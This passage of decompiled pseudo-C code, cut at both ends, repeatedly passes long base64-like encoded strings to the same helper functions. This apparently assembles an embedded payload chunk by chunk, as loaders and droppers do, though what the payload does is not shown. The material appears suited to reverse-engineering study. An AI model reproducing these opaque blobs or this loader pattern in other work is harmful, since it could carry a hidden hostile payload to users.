\"VdqHG+0Uu3lb+PjDzRzr3UmtXVRn4u+LRG8dUI9q22iq9x07iBiwa80cHU+2rBijW5in+HvkWDnhdN1Q0M9RcIGdcJTg28jC0SdVUG/dxQd35Fi/GywfkKf4kAHN8DUgh2iasLWsk2Ql5endi+VYsE1oWJCoe26C/iva6tFpdVg+6eR/DD+lFP+phEd1q5mfF3TXiJ8YsGvNCHg5+HCR6QyZKYHQbxVY5JOo43vDxWiHm1PjiOA3Brcn1n8EXmu1iGeeuK9g0cVccd10C+a/7wqyx09KRWpTG+PvTibl1f6sIx1kexobRoeusDNoa3VMvnwTZm9JFHu25tH9WCENZCs+gGHM508fA73QO+BQcqa9lyIPpzewM0SpW1Pp9y8Uzxin4Ihl48hdJ01YbUEIe78b0/VMezVsgwkbhA24YKCIazw1lX1YrG1RLHExPN150J+zjZOtcIcLX7PgiO+Osj5iy0ymFaUE9yJQO+lk0cVcw2H6V5P1DKMR61D9j11QN3Ec+TE80/V8IxV0g7WcAcWkiyH+6s71ragXKesf4Pj/mZybbIsVUKu1nLHF/Dshh6d9VLbp4Jeh1JbE/6mgO2Xh0d1QfVCHDH1LH3drfXiM6fyjZ/ji+HRvHQyP7YCz7Tgb9YSStNgDndxP8Ejn6ViU53MJILN3L+2gE1Dx4umzXWiX1GtlVD58m04cHzFzdW1bO+Ws21GgcdOMC9u420KS1DvwVJtM45W9HPcvpznhUNtoq4u6DUgXNBNyH8c74EiSrWwea72MZ6Cx0qHS0alw0okDXUjj\"\n    ;\n    puStack492 = &stack0xfffffe30;\n    puStack496 = &stack0xfffffe4c;\n    pcStack500 = 0x40664b;\n    puStack496 = fcn.00401091();\n    pcStack488 = 0xffffffff;\n    puStack492 = NULL;\n    pcStack500 = 0x40665b;\n    fcn.004011db();\n    if (0xf < puStack424) {\n        pcStack500 = puStack444;\n        puStack504 = 0x40666b;\n        fcn.0040b0dd();\n    }\n    pcStack500 = \n    \"WGltVFx94lMbl7Uc/uXV+acgWhrpBhjKiZLxHwCiOjN3r5PpHJ8I+/2hoDNcqidMIa10DUgXPn9yH8c6tCQaJ6HkYwB1muBbCZMNcKd7ooqIGL9Wimv2Y1XuEekYnybw/bGsO2IruJeTCOJVA11Ma0Zj2bdmRDNdbVkcy71tLWQt5aATUfzj1w3uxN8LHjDDkJdNTOufFfl05FcGpiOWQ0i6mc10m3boAbXMM0ukak1vURhzMRjQNJ2IcZCoOXiAC/a4ac0cscVhRwGXsfzve7LlWLAuqhoYLMGwoYgYO6V0aW1E9EeBo1KTwdF05FcGI4hxkKg5cYCD0L9WD8IRsLUlVVTrqm/bXeRYcUWgU1gjvWgJeedP4Ijb+b8wDBms5JetHPEkVzQLW6dvLQ6fDBfrTx8LHjDDk5dNTOufg/l05FcGpiOWQ0i6G8V0m3bogyix5UElVVBn4uiKqA9bO+lUVyZpOXmAC/a4ac04sf1JJW14Dx9rvaxvFVSf5ZCfK9ORiIiQsaEDpcD4POH8JaHkC2j/qbw74WBjWKd6e3p359ri02llQHKrEazkHAm+duRYd6OrWJCoEbKKiBh354PgOLBcuxqs5Nvn9nTkWFmoqliQI61kAdXod+er4DiwXLgarOTb5+h05FhZVKlYkCGlYE+PCbDgiAnDsbWs36v2HOD4nTNZsKQjDWQhpWBPjw2w4IgJ57G1rN+r8xzg+J1fWbCkwlrLIaVgT48AsOCICfuxtazfq/0c4Pide1mwpG9fiqj4kGEcGbDgT+cjsLWs8SXlHOBx\"\n    ;\n    puStack504 = &stack0xfffffe24;\n    puStack508 = &stack0xfffffe40;\n    pcStack512 = 0x406682;\n    puStack508 = fcn.00401091();\n    pcStack500 = 0xffffffff;\n    puStack504 = NULL;\n    pcStack512 = 0x406692;\n    fcn.004011db();\n    if (0xf < puStack436) {\n        pcStack512 = puStack456;\n        puStack516 = 0x4066a2;\n        fcn.0040b0dd();\n    }\n    pcStack512 = \n    \"KRSft4GoWJBBbJGIiHKyuwG9yHeymRis5PVj+XTk0e1Ub1+aqPiQYf0ZsOBP5z2wtazx/eUc4D9z4liwpEEekaj4V4+PGLDgYds5sLVrH5/kHOARROVYsM6qAxn1CFePvBiw4GHYObC1JUVcIxvH+HTksZqlqFgbbntwj7Pow9GztdjDlKOurm/Sa6WIZ564d0gam3BxxXwD3jm9dGPYt45canAPEif/VORYsE1/WJCoc810A10Ia0Zj2bdmRzNd38yW6PcaUMKs4tt+oMNA/3uR5RS7Mgt5PmoXByafGNh7p5KDdSug0Ke7WsKrwkalkOGx7UnYY58tla0A9x1cw9UtruSQe26A+z07tXwLOzvoUCP5BG+r98Lm0353SBqbcHHFfAveuGnVHLtOvd77o1LXIRN8Z7a4LfWke7xzxXxjGzu9dNttUMaMFxruXmmtgG8foGVIUJtpc91wAV+goWN3/7ecrBisDwIn/17kWLBPvtPFXMtLT486sOCICWdfSlPfq8Ic4Pj/obRG4bBa+lSjn81Qke0QszhMpzZX5Nj2l6VAn+3bTqzaUNorFpizWG9D00hpT7SGZRcHFZ8e2HunmYNsK6bQp7tRo92gO6VQqRv9SSVfjG9ZGHEzwNP1aCEfuCO9LAHPJDulgGl3iD7hDCX0l6UcX6FIRuGwURntHBmJh5yr4YjgvWu6JAut5BzTKrOhUACxqFhn3fAbx5QXBxFJCSgzyEgYJbHc73yi5FiwG1mnkKjLUAHNDDMaj+++MbWsGCeZCIr/LM8doC3t7Btwc9WY\"\n    ;\n    puStack516 = &stack0xfffffe18;\n    puStack520 = &stack0xfffffe34;\n    pcStack524 = 0x4066b9;\n    puStack520 = fcn.00401091();\n    pcStack512 = 0xffffffff;\n    puStack516 = NULL;\n    pcStack524 = 0x4066c9;\n    fcn.004011db();\n    if (0xf < puStack448) {\n        pcStack524 = puStack468;\n        puStack528 = 0x4066d9;\n        fcn.0040b0dd();\n    }\n    pcStack524 = \n    \"C9+47z7gO0A+6QivKhNWuHXnqDvhuFtep07QiovoO6WY4/a/A+wbrxSXpeh3KlcG5KxbYCO9gItGFwagjePIO/C8G2LrqqD+dxTT9bSrlp8euJeLeJP18AsgMLN7JV2859/bOgZz0c2wI58vWQeQiLPaw/MDvSibZaOur+fso/u6ri1FLfVIo3pzVn9/k3FretPqR0InXUjPWSBzvm8NuC3tvBn9OJ8NvedPHwO9yDvIaNlN9B8ucTv43WvRp67VsPnkgbNXoIp2uDf1bSfbR+uXpeweGduQpCMdmCvYkNDXRutrbb37Ff7sGHyvXOAUP6RYA+noWFL0uJCa0ViwutGgOCTs7BhuuFzgpS6kWOUvRAnB+67HA3KR/RwDL9CvfFPnJ7kUazD957D6ElenG1h9ZvyUT0+VdGvrO3tE9GQb47mh8SQsuS9msPoeB2+7fkc7Jta7s1Xob00nCE2xqyKz082sI4IZ5QQbh2AQBh93a8g1Q9gE/xtpHHOjb5ZY0mOnb/GhFUj8ETsuYMiOT0qf7vNv2r6j/wEFc/EjtBNE9MPeA8I7Ed+zse1NUw1wHVzgcTEYp6X0VBiQIwATb4tfxLu7Ms/FScY0WzSVpQz56Avqn2Mums7BgfyCm1niYxJeiaTZGy8lHu9PZYLdYtCJMryDNsvus8vE8e5pLjNzrhcb4C1rKBJhmMVOIwVoI71k4qdB1mmGY/6y+tm9nyRDhnFyugM7QfWbxSMUwdsDRbi232ltTD5VoqTsHOBzvwwcBVtX4iNReJYxOPjw4GBkgk9KJ+gn\"\n    ;\n    puStack528 = &stack0xfffffe0c;\n    puStack532 = &stack0xfffffe28;\n    pcStack536 = 0x4066f0;\n    puStack532 = fcn.00401091();\n    pcStack524 = 0xffffffff;\n    puStack528 = NULL;\n    pcStack536 = 0x406700;\n    fcn.004011db();\n    if (0xf < puStack460) {\n        pcStack536 = puStack480;\n        puStack540 = 0x406710;\n        fcn.0040b0dd();\n    }\n    pcStack536 = \n    \"L5c2EEgbp08vZrC5EwdvMjvhMOYxYNrwtUR7Fhvjs6//FNU7pKxYkP6QkIqIGOEfnaTG8LUv3Lhv0ggBzhunO9lUa0LC+8kDzxwzIIoXyXFVrpNkDNRUB4tvqDnRVN1m3I0b34yTv7ZgzI1PSvWR6ezj9aiIpFg78aDTaCsfnwNGm3fkYDGNT0ohUK3n0wh2wBunO1Qh65Cg+JANfmyea19r9lgbEedTb0no+4NvJUwvZ56Wlb7GYHutTx+LEBMDtaQYrL2VU/x85FhbpyMlbCM3eAI850/TSNm7sL2sGPO6E3U4L2+97Wcj0ZCg+JBh5axPHzBA2/C1D7i9pRxDXGWlWINkiV08ubmQKyAJ8eCx5ZhT9axstKS/SOk15NuMYQi70Kj45XjZ8E1edx9hc4Zs2/lv8GEUzOxYsC/lUB3tDMbf2JPh5APp//VZvBis5PSBBYsb082oI6jJIY1gC68YM4eM4LO9Gb1ZrKWV7VRlpVg1Uqfco6n4kAXd9D2tbAi5sbWsnWzrmPP5dOTV9Xj41cVMEIA3d+fpZUjvvEa1rBgWV+Vg/s20uvCkQJcoVwcbnSwJ8eADELU15VPnU+uq6ql7UhKx9afu2qqpnz7CG+G24qBoT6Do5uzknyTk/yqw4R1Xpx0tsGd3d0g9tVRtteBKU+dEM+EfBy1hmL8gIViQqHXVXNjnBax3H8c9MOTjUxvjVbCLG6fh9CXd2F8Hb9gpvKGhiG214EpT58pvTOQQdVanTydsQBVojNQFzeDgbd000I4KU+f1YdyU0/+poD3zrNOR\"\n    ;\n    puStack540 = &stack0xfffffe00;\n    puStack544 = &stack0xfffffe1c;\n    pcStack548 = 0x406727;\n    puStack544 = fcn.00401091();\n    pcStack536 = 0xffffffff;\n    puStack540 = NULL;\n    pcStack548 = 0x406737;\n    fcn.004011db();\n    if (0xf < puStack472) {\n        pcStack548 = puStack492;\n        puStack552 = 0x406747;\n        fcn.0040b0dd();\n    }\n    pcStack548 = \n    \"IfqtiIgYsZOdsrPlSS/ZqGlOHBDmGKdP/SMVaCH/eG46509rxTTQbgdT5yFpVBcHiwwDTltX0910EFs6d+c7lXhrdVRdbKpTG5cuEM1Wp08vpfSB6fijSLEfv6VAaTUcpO0YleND7220utNV+Wv5NLm5kAtIEBNEmaE4M42sF+jhvPG5dEf8oeWom8b/c2FgDqFPHwWuPDtNRJcVG+Nr9v80sMcdV6eTeHWU8tdGc7UDDGnh4/uTVm/tazecLqdPWyOQGe78eHY5509pjmX4xJb7cqxWHWm9iGkVTEz14W9XddeMOhrgioptdUxd4aFTG58k6EckYbb7p81Q9nN11UtNOwwJDMS1taxOa2EYGgeLRxzQqm/dmFIHb1YwT8MnDezCT0oXiSwP22XojhunAUw8hFct7Gp3d46Wy2cnvahPU+fIV/BYP/H4ok9bazY89j8VqHLnT/R+czN3MIjiUxvSmindI92YXlenwC/r2E8NNEofd1nm62VrnZwe4x8DZOdrdyGcom9X/+bWE9812HIfxwXGMnxrYSAaB4tXMEIjb93QUgdv62aO9ScNpMJPSmH+6x3bZbCOG6cpqKE4Vy20and3pfKL9Se94E9T56fR3Y4/8bCiT1uA4iNIPxXQcudPe7Cqs3cw8OJTG1lTCjoj3dBeV6fQ+Hj/Tw18Sh93gI8BnWudxB7jH6LJxyV3IcSib1dvJt143zWQch/HE9o9D2thaBoHi5ouhINv3ehSB29HXgAjJw2cwk9KPiZgHttleI4bp4HAX2NXLXxqd3fogAdUJ704\"\n    ;\n    puStack552 = &stack0xfffffdf4;\n    puStack556 = &stack0xfffffe10;\n    pcStack560 = 0x40675e;\n    puStack556 = fcn.00401091();\n    pcStack548 = 0xffffffff;\n    puStack552 = NULL;\n    pcStack560 = 0x40676e;\n    fcn.004011db();\n    if (0xf < puStack484) {\n        pcStack560 = puStack504;\n        puStack564 = 0x40677e;\n        fcn.0040b0dd();\n    }\n    pcStack560 = \n    \"T1PnZPoN+D/xaKJPWwN3I/w/FRhy508vtMCPdzA44lMb/sla+iPdKF5Xp5IVjqlPDYRKH3dM0EUja50MHuMfVyFYEXchDKJvV2RGyrvfNUhyH8e7SIIOa2GwGgeLyiHgEW/dIFIHb+Lu7IgnDVTCT0rxzgq322VAjhun8qsLf1ctRGp3d6+9Ai8nvXBPU+cUrMKdP/Egok9biNvo3z8VQHLnT37SplV3MGDiUxtf3XzzI91gXlenqeITo08NzEofd/+9ipZrnXQe4x+YW9scdyF0om9XlsQK+d81AHIfx/ZTMuxrYfgaB4urctV3b914UgdvHZBUGycNDMJPSnDZKK3bZQiOG6eAeHwWVy0Mand3JUf1fie9SE9T52r7ev4/8RiiT1tI5ABuPxWIc+dPOxykO3cwqONTG57cUdQj3bhfV6d3dEOXTw0USx93VHiLwWudvB/jHy4zK+J3Ibyjb1devkSC3zX4cx/HP9OuJWthABsHi0m6gPtv3bBTB2/t+P5sJw3Ew09Kwm0t/ttl0I8bp9/auqFXLdRrd3cAWZ3BJ72ATlPnfHb/pT/x0KNPWziEGiQ/FbBz508C+JL8dzCQ41MbU+gY6CPd8F9XpxFNEjNPDVxLH3ekVZG0a53kH+Mf4G1lGHch5KNvV/8wjFHfNbBzH8c3ByX8a2FIGweLE+hFLW/dyFMHb7tgZLwnDbzDT0pf/Fv622WYjxun4Cccl1ctnGt3d/Tk6WsnvdhOU+fQ5pU2P/GIo09bRSfR5D8V+HPnT5Qhhb53MNjjUxt6m2zBI93I\"\n    ;\n    puStack564 = &stack0xfffffde8;\n    puStack568 = &stack0xfffffe04;\n    pcStack572 = 0x406795;\n    puStack568 = fcn.00401091();\n    pcStack560 = 0xffffffff;\n    puStack564 = NULL;\n    pcStack572 = 0x4067a5;\n    fcn.004011db();\n    if (0xf < puStack496) {\n        pcStack572 = puStack516;\n        puStack576 = 0x4067b5;\n        fcn.0040b0dd();\n    }\n    pcStack572 = \n    \"X1en+Rj4gU8NZEsfd8iu2YFrnSwf4x/BqJx7dyEso29X335rmd81aHMfxxEWRUprYZAbB4vLTwKMb90AUwdvmu+QfCcNdMNPStVlHJ3bZWCPG6faZTrMVy1ka3d3eMmnWSe9EE5T5zDsfso/8UCjT1uCXflsPxUgc+dPPIk2OncwAONTG6bC7Usj3QBfV6cdX2TZTw2sSx93d7u+HGudFB/jH18oT313IRSjb1fU6d4R3zUgcx/Hb4IF62th2BsHi6W0vyBv3VhTB29b9/QSJw0sw09K7p8lfNtlKI8bp4R95MVXLSxrd3f3JgoTJ71oTlPnhdxdnD/xOKNPW0y2rsM/FWhz50+Ltq8hdzBI41MbcCw2OCPdWF9Xp/E1X9VPDfRLH3dCWCGua51cH+MfjxlJd3chXKNvV2i/BDHfNRhzH8d/VQO2a2HgGweLodRQQ2/dkFQHb+N5cfQnDeTET0r8zSvH22XwiBunJ6+Gw1ct9Gx3d8E35fMnvaBJU+eIpJ73P/HwpE9bOH/+DT8VkHTnT+UFait3MLDkUxuMHDoxI92QWFeneoXfxE8NPEwfd/8rMrJrnYQY4x8+ENGWdyGEpG9X8u2Qbd810HQfx+W6eAVrYSgcB4sR1+O/b92oVAdvRZY7bScN3MRPSnIhvS3bZbiIG6eTa0BTVy28bHd3dLIGICe9+ElT53QrLiE/8aikT1tpls4JPxXYdOdPI2zu/ncw+ORTG7MpDjsj3ehYV6ff8ZYzTw1ETB93m/75O2udzBjjH8NY3lJ3Icykb1ec9UXS3zWI\"\n    ;\n    puStack576 = &stack0xfffffddc;\n    puStack580 = &stack0xfffffdf8;\n    pcStack584 = 0x4067cc;\n    puStack580 = fcn.00401091();\n    pcStack572 = 0xffffffff;\n    puStack576 = NULL;\n    pcStack584 = 0x4067dc;\n    fcn.004011db();\n    if (0xf < puStack508) {\n        pcStack584 = puStack528;\n        puStack588 = 0x4067ec;\n        fcn.0040b0dd();\n    }\n    pcStack584 = \n    \"dB/HJbY972thcBwHi7e4zORv3eBUB2/X/jLYJw2UxE9KUln5AdtlgIgbpyzNqbBXLYRsd3cCqt68J70wSVPncgqH9j/xYKRPW9Tn/Mo/FQB050+VlGA1dzAg5FMb1pGguSPdIFhXp/Hntb9PDYxMH3eeTlIKa500GOMfpnUVTnchNKRvV60y8irfNUB0H8ccEDRNa2G4HAeLDQRiT2/dOFQHb+Da9CAnDUzET0oGIJAC22VIiBunyEh9FVctTGx3dxRu/qYnvQhJU+dFipRNP/FYpE9b19LChz8VSHTnT3Jd9Dd3MGjkUxshh5SNI914WFenabcy+E8N1EwfdxmB+NdrnXwY4x+jsZN8dyF8pG9Xkkl8c981OHQfx3QyQDdrYcAcB4udPjEtb91wVAdvKOmiUicNBMRPSuRzhQfbZRCIG6eEP1Y9Vy0UbHd3Mi4fSie9QElT539ZKKI/8RCkT1sbT2I9PxVwdOdPMByfLncwUORTG/UkGB8j3bBZV6eXgiqfTw0cTR93WyiePGudpBnjH8ztfBB3IaSlb1dMdD4n3zXwdR/HfAIvGGthCB0Hiwvm0c9v3YhVB2/mmuOoJw38xU9KqIWnC9tl2IkbpzrGv+9XLdxtd3eYKgbyJ72YSFPnr73tLj/xyKVPW7iEMQs/Fbh150/bUmRkdzCY5VMbE7k5USPdiFlXp2zJVKxPDSRNH3fYvAZTa53sGeMft5yUx3ch7KVvV7iRI/zfNah1H8eAxo1La2FQHQeL9gBdDW/dwFUHb/GKN9gnDbTFT0rXBXBC22Wg\"\n    ;\n    puStack588 = &stack0xfffffdd0;\n    puStack592 = &stack0xfffffdec;\n    pcStack596 = 0x406803;\n    puStack592 = fcn.00401091();\n    pcStack584 = 0xffffffff;\n    puStack588 = NULL;\n    pcStack596 = 0x406813;\n    fcn.004011db();\n    if (0xf < puStack520) {\n        pcStack596 = puStack540;\n        puStack600 = 0x406823;\n        fcn.0040b0dd();\n    }\n    pcStack596 = \n    \"iRunWH6MbVctpG13dztTxvcnvdBIU+dW0dHEP/GApU9bYUktPT8V4HXnTzUg7zR3MMDlUxulsG5vI93AWVenrtnwE08NbE0fd7z+PDtrndQZ4x80aYojdyHUpW9XPyfan981YHUfx59060RrYZgdB4uo8OHzb90YVQdvFWheFycNbMVPSqpdDvnbZWiJG6cdqJBeVy1sbXd3GsF3qie9KEhT57W0UVE/8XilT1tLTfDDPxUodedPxooaxncwCOVTG+xFc1Mj3RhZV6c4Dv7TTw20TR93FWG/cGudHBnjH16C3rN3IRylb1fhmTHZ3zVYdR/HLNGyhmthoB0Hi1pW3k9v3VBVB28epY34Jw0kxU9KwioQMdtlMIkbp1wdk8VXLTRtd3dp3S/yJ71gSFPn/dQs1D/xMKVPW+HFUlM/FVB150/8ERowdzBw5VMbqV+8kyPdUFlXp5E4isZPDfxNH3eUumuda51EGeMfF2Lki3chRKVvV8ciGSzfNRB1H8c4OfNba2HoHQeLQM5MhG/daFUHb/9eR1onDRzFT0pe+9ML22X4ihunnaza61ct/G53d/GaKacnvbhLU+f2R5tUP/Hopk9bmXhHgD8VmHbnTwHUT6d3MLjmUxsw6RE/I92oWlenWsj3WE8NBE4fd7hjwihrnYwa4x+fkRZ0dyGMpm9XfaiYp981yHYfxyGG3fZrYTAeB4sNrZDDb92gVgdvBmJ5NCcN1MZPSm+swxnbZcCKG6eTH/V6Vy3Ebnd3smnE5Ce98EtT51hpwPY/8aCmT1vA+H6oPxXA\"\n    ;\n    puStack600 = &stack0xfffffdc4;\n    puStack604 = &stack0xfffffde0;\n    pcStack608 = 0x40683a;\n    puStack604 = fcn.00401091();\n    pcStack596 = 0xffffffff;\n    puStack600 = NULL;\n    pcStack608 = 0x40684a;\n    fcn.004011db();\n    if (0xf < puStack532) {\n        pcStack608 = puStack552;\n        puStack612 = 0x40685a;\n        fcn.0040b0dd();\n    }\n    pcStack608 = \n    \"dudP0IHSKHcw4OZTG/VOlrUj3eBaV6cczldOTw1MTh933bXI1Gud9BrjHyQObO13IfSmb1fAhfpf3zWAdh/HzB9ktGtheB4Hi2R0ZaVv3fhWB28rOsB3Jw2Mxk9KGEpCENtliIobp7yR59FXLYxud3ei7KqIJ73IS1PnWt+oEz/xmKZPW/riXVA/FQh2508B1plhdzAo5lMby0CcpyPdOFpXp8mRIXJPDZROH3fz9K8ja508GuMfNcSod3chPKZvV6b2/C7fNXh2H8fgooM7a2GAHgeLslnCQG/dMFYHb+cTgEsnDUTGT0pUWcsy22VQihunG3g6UlctVG53d9GOvnAnvQBLU+cBkGyMP/FQpk9bFTMhnT8VMHbnT+Xmh5p3MBDmUxsha8WPI91wWlenq7Z4wE8N3E4fdx1gAdNrnWQa4x9G47vddyFkpm9X2AgS2981MHYfx5rENdVrYcgeB4vZqgg9b91IVgdvSR3tSicNPMZPSmKGuyPbZRiKG6dLOFL9Vy0cbnd3Bh2Ryie9WEtT5/Y6vXs/8QimT1tdRkhVPxV4dudP7PHYw3cwWOZTG0CbSvoj3UhaV6c4lxNOTw3kTh93JraSHWudrBvjH2uq/wl3Iaynb1fhJQfn3zXodx/HvD3zwGthEB8Hi+zEwrYSg+oF7lcNmOdPHwR4NPQMfP/s5Ntl7Isbp0hGZvpXLeBvd3fPvJIDJ72sSlPnOb8hvT/xxKdPW4SWwxI/Fax350++P6K0dzCE51Mbfsu/eCPdnFtXp9/UY/1PDShPH3fL6+cua52Y\"\n    ;\n    puStack612 = &stack0xfffffdb8;\n    puStack616 = &stack0xfffffdd4;\n    pcStack620 = 0x406871;\n    puStack616 = fcn.00401091();\n    pcStack608 = 0xffffffff;\n    puStack612 = NULL;\n    pcStack620 = 0x406881;\n    fcn.004011db();\n    if (0xf < puStack544) {\n        pcStack620 = puStack564;\n        puStack624 = 0x406891;\n        fcn.0040b0dd();\n    }\n    pcStack620 = \n    \"G+MfTPu8J3chkKdvVwmN7R/fNdx3H8cxWUFva2FcHweLIPfrnG/d1FcHb/FxEOQnDajHT0qu26c122W0ixunZpkE2lctqG93dy4Z7jMnveRKU+dp33WJP/G8p09bPG/NZj8V1HfnTxbA7sF3MMznUxs7LLIFI93UW1enWQ3Ey08NcE8fdxVI18trncAb4x+Ljfg7dyHYp29Xfq1XR981lHcfx/0+KKRrYWQfB4t6qlRgb93sVwdvueODCCfNYJJbGYnf6WDxIemoIx04WPZWM2+9HOZ2me4nzXAnI0/Y3+lwb6LcUCMdKFGCcE5vvQwEYuaWJ81ALQBANd/pQEUlDKQjHRghyr6bb708vD3y5ifNUJa7iMDf6VBihmRyIx0IuqMLBW+9LHv0eOknzSAiaMxQ3+kgPpjfEiMdeAfcUUJvvVwFpFsXJ80wQy30k9/pMK6zxesjHWiGXYLwb71M2dHdcSfNADMbzvrf6QDTd4mhIx1YEq7pYm+9fGCSFS0nzRDT68yy3+kQrMN5+yMdSHWGHPlvvWxDR+x2CPFIx08+XE5T8ZAduHRvlhPMuRmQQOM5d3eTvYiZoTg9IKjiUxt04Bc05DAoKA8j+Nf5kIhg6RAfd2P8vOsn/fEnSWsU9QiEt6SoDlct3Gh3d5MkQV0nvZhNU+eNkXP8P/HIoE9b+EsAQj8VuHDnT08NLzh3MJjgUxv3K881I92IXFenPJx8R08NJEgfd8VAGxNrnewc4x8VoHszdyHsoG9XjNd0vd81qHAfx6TzFflrYVAYB4vfL0W3b93A\"\n    ;\n    puStack624 = &stack0xfffffdac;\n    puStack628 = &stack0xfffffdc8;\n    pcStack632 = 0x4068a8;\n    puStack628 = fcn.00401091();\n    pcStack620 = 0xffffffff;\n    puStack624 = NULL;\n    pcStack632 = 0x4068b8;\n    fcn.004011db();\n    if (0xf < puStack556) {\n        pcStack632 = puStack576;\n        puStack636 = 0x4068c8;\n        fcn.0040b0dd();\n    }\n    pcStack632 = \n    \"UAdvCYKt4CcNtMBPSiFcQrXbZaCMG6chhIG2Vy2kaHd3K/eGqye90E1T54V2/ks/8YCgT1uEKnHzPxXgcOdPkZ64qncwwOBTGytUUa0j3cBcV6fRksCQTw1sSB93PisI9Gud1BzjH3WjGEN3IdSgb1failTm3zVgcB/H25pwH2thmBgHi5qabIJv3RhQB286IdRVJw1swE9KkrFx0ttlaIwbp8QvjpRXLWxod3fFMOKlJ70oTVPnitDQcj/xeKBPW9HtyiA/FShw50/u2bEEdzAI4FMbfz8KlyPdGFxXp+u3aSNPDbRIH3casQYaa50cHOMfHyjboHchHKBvV14MsLbfNVhwH8frl5J4a2GgGAeLv1BGI2/dUFAHb9iKnEAnDSTAT0rdNBLh22UwjBunB6KtIFctNGh3d80ut8wnvWBNU+ek8yybP/EwoE9bdtaInz8VUHDnT8B4VfZ3MHDgUxs0tgrqI91QXFennASJKE8N/Egfd7zCgYJrnUQc4x/hf64odyFEoG9XrrnC4d81EHAfx9MLlPdrYegYB4s9h95Cb91oUAdvuYg3nCcNHMBPSk5z9mnbZfiNG6fklZhYVy38aXd3FwtmSie9uExT54d2bFE/8eihT1swM44GPxWYcedPPvrtzHcwuOFTG+Sp718j3ahdV6fOO/MsTw0ESR93MfK0l2udjB3jH/t/SrF3IYyhb1eKB1m03zXIcR/H5/b3JWthMBkHi0h4dShv3aBRB2+S/qgDJw3UwU9KVsIcCdtlwI0bp/ERVVxXLcRpd3cjVnvjJ73w\"\n    ;\n    puStack636 = &stack0xfffffda0;\n    puStack640 = &stack0xfffffdbc;\n    pcStack644 = 0x4068df;\n    puStack640 = fcn.00401091();\n    pcStack632 = 0xffffffff;\n    puStack636 = NULL;\n    pcStack644 = 0x4068ef;\n    fcn.004011db();\n    if (0xf < puStack568) {\n        pcStack644 = puStack588;\n        puStack648 = 0x4068ff;\n        fcn.0040b0dd();\n    }\n    pcStack644 = \n    \"TFPnQ46ptT/xoKFPW6gUeYk/FcBx508U3F8+dzDg4VMb57S6YyPd4F1XpyMt6LtPDUxJH3edKnB9a530HeMf9FUQTXch9KFvVyZeXWXfNYBxH8cgWY+Ta2F4GQeL8rTpm2/d+FEHb6ETt9MnDYzBT0oiR+W222WIjRunKhU9rFctjGl3dyrMXSEnvchMU+e2iDjbP/GYoU9bWwHezT8VCHHnTw0qULB3MCjhUxuaym72I904XVenOG2li08NlEkfdz2olBFrnTwd4x+gN4i6dyE8oW9XXOu5s981eHEfx9P4k4NrYYAZB4tcJVC4b90wUQdvvCQc4ycNRMFPSgdePm7bZVCNG6cW2uG4Vy1UaXd35zDsGCe9AExT5wqrEHY/8VChT1t0qqXDPxUwcedPEBQtE3cwEOFTGxF+IDoj3XBdV6eUk9ifTw3cSR93jCvGI2udZB3jH9a1ojR3IWShb1elu4l83zUwcR/Hb8JySWthyBkHi1Qgai1v3UhRB2+XlQdaJw08wU9KKbAocttlGI0bp2yf1ltXLRxpd3f0j63oJ71YTFPnBPkgmD/xCKFPW1Au7Lw/FXhx50/fW9WBdzBY4VMbn5DCvCPdSF1Xp5TM+gBPDeRJH3dq+zXKa52sHuMfM6dvBHchrKJvVzl8psjfNehyH8eL1pdba2EQGgeLVDnaiW/dgFIHb23XemInDfTCT0pV8nw/22XgjhunVBYSHVct5Gp3d7mwL2QnvZBPU+cN04U4P/HAok9b4diWVD8VoHLnT7B8YrB3MIDiUxua1PqdI92A\"\n    ;\n    puStack648 = &stack0xfffffd94;\n    puStack652 = &stack0xfffffdb0;\n    pcStack656 = 0x406916;\n    puStack652 = fcn.00401091();\n    pcStack644 = 0xffffffff;\n    puStack648 = NULL;\n    pcStack656 = 0x406926;\n    fcn.004011db();\n    if (0xf < puStack580) {\n        pcStack656 = puStack600;\n        puStack660 = 0x406936;\n        fcn.0040b0dd();\n    }\n    pcStack656 = \n    \"XlenLLwHA08NLEofd0Ad/4BrnZQe4x/jexvNdyGUom9X/7qFyt81oHIfx3nDNRRrYVgaB4ss6/Lgb93YUgdvWfIkMicNrMJPSnx+Dj/bZaiOG6fUjEA+Vy2sand3cSGTbSe96E9T51eDn8A/8biiT1vULZT0PxXocudPgxr/EXcwyOJTG9dpsWQj3dheV6cDNw58Tw10Sh93vvRyQ2ud3B7jH+QZmSt3Idyib1f+pgVT3zWYch/HI9WybWthYBoHi/i83ohv3RBSB28OoCvMJw1kwk9KYb1z59tlcI4bp3l5gAlXLXRqd3fxxzOQJ70gT1PnBWKaxj/xcKJPW3FmLJg/FRBy5094Ln4DdzAw4lMbYYLoCSPdEF5Xp2bJjKpPDbxKH3eb7UYYa50EHuMfa1qbYnchBKJvV41vs93fNVByH8cbbhxRa2GoGgeLnCBlSm/dKFIHb6nI5mAnDVzCT0pFXGeN22U4jhun2h0fa1ctPGp3d+6d0hMnvXhPU+fDXBBHP/Eook9bWtYQ5T8VWHLnT+2sa2p3MHjiUxvE0NheI91oXlenWhQ4U08NxEofd0S/qDdrnUwe4x9unr7ydyFMom9Xflfvbt81CHIfx71dGi5rYfAaB4tFRIKwb91gUgdvrIs/7icNFMJPShlNnDLbZQCOG6dPrVccVy0Eand3eSEWyie9sE5T58C0L3k/8eCjT1tLiTHuPxWAc+dPbFBTbXcwoONTG1ka/Z0j3aBfV6fIrhegTw0MSx93mKV1dGudtB/jH+FeSk93IbSjb1dReEgP3zXA\"\n    ;\n    puStack660 = &stack0xfffffd88;\n    puStack664 = &stack0xfffffda4;\n    pcStack668 = 0x40694d;\n    puStack664 = fcn.00401091();\n    pcStack656 = 0xffffffff;\n    puStack660 = NULL;\n    pcStack668 = 0x40695d;\n    fcn.004011db();\n    if (0xf < puStack592) {\n        pcStack668 = puStack612;\n        puStack672 = 0x40696d;\n        fcn.0040b0dd();\n    }\n    pcStack668 = \n    